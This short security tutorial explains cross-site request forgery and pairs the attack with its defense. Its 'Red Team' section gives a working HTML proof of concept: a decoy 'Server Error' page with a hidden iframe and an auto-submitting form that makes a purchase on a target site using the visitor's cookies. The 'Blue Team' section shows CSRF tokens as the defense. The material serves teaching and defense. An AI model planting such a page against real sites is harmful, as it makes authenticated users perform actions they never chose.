# Cross Site Request Forgery (CSRF) POST

A CSRF attack is when someone makes a request as a user on a different site without that user knowingly prompting the request. This works if the user is already authenticated with the target site via cookies, because browsers will automatically attach a site's cookies to any requests to that site.

[No need for CSRF protection with APIs that don't use cookies](https://security.stackexchange.com/questions/166724/should-i-use-csrf-protection-on-rest-api-endpoints#comment338757_166798)

## Red Team

On your fake application create an `iframe` with a POST action to the target website. Trick a user into visiting this page, and as long as they are already authenticated with the real site (and not using CSRF tokens) the POST request will be successfully sent.

```html
<!-- fake.example.com -->
<html>
  <body>
    <p>Server Error. Please try again later</p>

    <!--
      The iframe is useful for preventing a redirect on submit(), since
      the domain to submit to is different than the current domain.
    -->
    <iframe style="display: none;" name="csrf-frame"></iframe>
    <form id="csrf-form" action="https://real.example.com/shop" method="POST" target="csrf-frame">
      <input type="hidden" name="purchased_item" value="something_nice">
    </form>
    <script>document.getElementById('csrf-form').submit()</script>
  </body>
</html>
```

## Blue Team

To protect against CSRF attacks utilize CSRF tokens to validate that the request actually came from your own site.

```html
<form action="/shop" method="post">
  <input type="hidden" name="csrf-token" value="<%= dynamically_generated_csrf_token %>">
  <input type="hidden" name="purchased_item" value="something_nice">
  <button id="purchase">Buy</button>
</form>
```
